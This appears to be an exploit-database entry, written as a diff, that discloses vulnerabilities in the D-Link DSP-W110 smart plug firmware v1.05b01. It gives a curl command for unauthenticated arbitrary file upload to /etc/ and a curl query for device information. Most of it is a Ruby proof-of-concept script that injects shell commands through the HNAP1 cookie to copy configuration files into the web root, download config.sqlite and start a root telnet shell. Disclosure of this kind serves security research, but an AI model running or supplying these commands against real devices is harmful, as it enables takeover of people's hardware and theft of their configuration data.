@@ -1,0 +1,168 @@
+# Exploit Title: D-Link DSP-W Arbitrary Arbitrary file upload
+# Date: 30/06/2015
+# Exploit Author: DNO
+# Vendor Homepage: [link]
+# Version: w110 v1.05b01
+# Tested on: linux
+# CVE :  N/A
+
+========================================
+
+the only 'filtering' on this resources appears to be a sprintf()
+call which statically prefixes a submitted 'dev' argument with '/www'.
+However,
+if a HTTP request is performed without a 'dev' argument at all, the
+sprintf() call is never reached,
+and a fully-qualified path can be provided in the 'path' parameter -
+bypassing the upload path restriction.
+
+***************
+# Upload arbitrary files to the device.
+echo 'Some String' > test.txt
+curl \
+ -X POST \
+ -i \
+ -F name=@test.txt \
+ --http1.0 \
+ '192.168.1.3/web_cgi.cgi?&request=UploadFile&path=/etc/'
+
+ ========================================
+
+# Exploit Title: D-Link DSP-W Diagnostic Information " Get info"
+# Date: 30/06/2015
+# Exploit Author: DNO
+# Version: w110 v1.05b01
+# Tested on: linux
+# CVE : N/A
+
+========================================
+Severity Level:
+===============
+High
+===============
+Patches made to lighttpd by the vendor of this device allows an attacker to
+query the device, without authentication, for the following information:
+
+# Current WLAN SSIDs
+# Current WLAN channels
+# LAN and WAN MAC addressing
+# Current firmware version information
+# Hardware version information
+
+Although not sensitive information, it may allow for identification of
+devices running vulnerable firmware versions.
+
+=========================================
+# Information query.
+curl \
+192.168.1.3/mplist.txt
+
+========================================
+#ruby poc
+----
+
+# DSP-W110-Lighttpd PoC.
+
+require 'pp'
+require 'optparse'
+require 'restclient'
+
+# Set defaults and parse command line arguments
+options = {}
+
+options[:addr] = "192.168.0.60"
+options[:port] = 80
+
+OptionParser.new do |option|
+
+option.on("--address [ADDRESS]", "Destination hostname or IP") do |a|
+options[:addr] = a
+end
+
+option.on("--port [PORT]", "Destination TCP port") do |p|
+options[:port] = p
+end
+
+option.parse!
+
+end
+
+# Define which actions we will be using.
+actions = [
+{
+:name => "Get device information",
+:call => "txt_parser",
+:path => "mplist.txt",
+},
+{
+:name => "Snatch configuration",
+:call => "noop",
+:path => "HNAP1",
+:cookies => { :cookie => "`cp /etc/co* /www/`" }
+},
+{
+:name => "Fetch configuration",
+:call => "conf_writer",
+:path => "config.sqlite",
+},
+{
+:name => "Enable telnet (root)",
+:call => "noop",
+:path => "HNAP1",
+:cookies => { :cookie => "`telnetd -l/bin/sh`" }
+}
+]
+
+def noop(val)
+return
+end
+
+def txt_parser(txt)
+txt.split(/\r?\n/).each do |line|
+puts " #{line}"
+end
+end
+
+def conf_writer(txt)
+begin
+f = File.open('./config.sqlite', 'wb')
+rescue => e
+puts "[!] Failed to open config.sqlite for writing #{e.message}"
+end
+f.write(txt)
+f.close
+puts "[*] Configuration fetched into 'config.sqlite'"
+end
+
+# Iterate over all actions and attempt to execute.
+url = "http://#{options[:addr]}:#{options[:port]}"
+
+puts "[!] Attempting to extract information from #{url}"
+
+actions.each do |action|
+
+# Fire the request and ensure a 200 OKAY.
+begin
+response = RestClient.get(
+"#{url}/#{action[:path]}",
+{:cookies => action[:cookies]}
+)
+rescue
+puts "[!] Failed to query remote host."
+abort
+end
+
+if response.code != 200
+puts "[-] '#{action[:name]}' failed with response: #{response.code}"
+next
+end
+
+# Send to the processor.
+puts "[*] #{action[:name]} request succeeded."
+send(action[:call], response.body())
+
+end
+===================================
+
+ contact me FB : FB.COM/haker.dyno
+ Copyright © 2015 /DNO/
